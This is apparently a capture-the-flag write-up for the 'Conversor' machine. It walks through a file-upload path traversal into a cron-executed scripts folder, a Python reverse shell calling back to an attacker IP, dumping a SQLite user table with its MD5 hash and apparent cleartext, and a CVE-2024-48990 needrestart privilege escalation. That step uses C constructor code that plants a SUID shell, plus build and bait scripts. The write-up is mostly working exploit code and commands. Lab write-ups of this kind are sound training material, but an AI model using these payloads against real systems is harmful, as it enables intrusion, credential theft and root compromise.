
---
# User Flag:
Technique: File Upload Path Traversal leading to RCE via Cron Job.
### 1. Reconnaissance & Analysis

We started by analyzing the source code (`app.py`) provided for the Flask application.
- **Vulnerability Identified:** The application processes file uploads in the `/convert` endpoint using `os.path.join(UPLOAD_FOLDER, xml_file.filename)`. It fails to sanitize the `filename`, allowing for **Path Traversal**.
- **Information Disclosure:** We examined `install.md` found in the web root, which revealed a critical system configuration:
>`* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done`

This cron job blindly executes **any** Python script found in the `/var/www/conversor.htb/scripts/` directory every minute.
### 2. Exploitation (Remote Code Execution)

**Objective:** Place a malicious Python script into the `scripts/` folder to trigger the cron job.
**The Payload:**
We created a standard Python reverse shell script (shell.py) configured to connect back to our attack machine.
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.122",23))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

**The Attack Vector:**
1. We initiated a file upload on `/convert`.
2. We intercepted the request using **Burp Suite**.
3. We modified the `filename` parameter to traverse out of the `uploads` directory:
    - **Original:** `filename="shell.py"`
    - **Modified:** `filename="../scripts/shell.py"`
4. We forwarded the request. The application saved the file to `/var/www/conversor.htb/scripts/shell.py`.

**Execution:**
We started a netcat listener (nc -lvnp 4444). Within 60 seconds, the cron job executed our script, granting us a reverse shell as the www-data user.
### 3. Lateral Movement

**Credential Hunting:**
Based on the app.py configuration, we located the database at /var/www/conversor.htb/instance/users.db.
1. We accessed the database using `sqlite3`:
```sh
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```
2. **Result:** We retrieved the password hash for the user `fismathack`:
    - **User:** `fismathack`
    - **Hash:** `5b5c3ac3a1c897c94caad48e6c71fdec` (MD5)```
	      Keepmesafeandwarm```
**Cracking & Access:**
We identified the hash as MD5 and cracked it to reveal the plaintext password. We then used these credentials to log in via SSH:
```sh
ssh fismathack@conversor.htb
```

**Outcome:**
We successfully accessed the user account and captured the flag at /home/fismathack/user.txt.


# Root Flag:

### 1. Discovery & Enumeration

I started by checking what special permissions my user had using `sudo -l.
I found that I could run `/usr/sbin/needrestart` without a password. However, checking the version revealed it was 3.7, which is vulnerable to CVE-2024-48990.
The vulnerability allows a local attacker to hijack the environment variables of the root process. Specifically, if I run a process with a custom `PYTHONPATH` and then run `needrestart`, the root process inherits my malicious path and loads my code instead of the system libraries.
### 2. Preparing the Weapon (On My Machine)

To make the exploit reliable, I decided to use a compiled C shared object instead of a simple script. This ensures the payload executes immediately when loaded.
I created a file named `file.c` with a constructor function to execute a payload automatically:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a()
{
    system("cp /bin/sh /tmp/poc");
    system("chmod +s /tmp/poc");
}
```

I compiled this into a shared object named `__init__.so` and started a web server to host it:

```sh
gcc -fPIC -shared -o __init__.so file.c -nostartfiles
python3 -m http.server 8000
```

### 3. Setting the Trap (On the Victim)

I created an automation script  `exploit.sh` on the target machine. This script handled the entire setup to ensure perfect timing.

**The script did three key things:**
1. **Mimicry:** It created a directory `/tmp/malicious/importlib` and downloaded my malicious `__init__.so` into it. This tricked Python into treating my folder as the standard `importlib` library.
2. **The Bait:** It created a Python script (`e.py`) that ran in an infinite loop, acting as a target for `needrestart` to scan.
3. **The Hook:** It launched the bait script with `PYTHONPATH` pointing to my malicious folder.

```sh
cat << 'EOF' > /tmp/malicious/e.py

import time
import os
print("[*] Bait process started. Waiting for needrestart...")
while True:
    if os.path.exists("/tmp/poc"):
        print("\n[+] SUCCESS! /tmp/poc created.")
        print("[+] Spawning root shell...")
        # Execute the SUID shell
        os.system("/tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious
PYTHONPATH="$PWD" python3 e.py
```

### 4. Execution & Root
I executed the attack in two terminals:

**Terminal 1:**
I ran my `exploit.sh` script. It set up the trap and started the bait process, waiting for the trigger.

**Terminal 2:**
I logged in as `fismathack` and manually triggered the vulnerability:
```sh
sudo needrestart
```

**The Result:**
needrestart scanned my bait process, inherited the malicious `PYTHONPATH`, and accidentally loaded my `__init__.so` as root. The C payload fired instantly, creating a backdoor file at `/tmp/poc`.

My script detected the new file and automatically spawned a root shell.
After getting access to root i found the root flag and thats it **conversor got pwnd**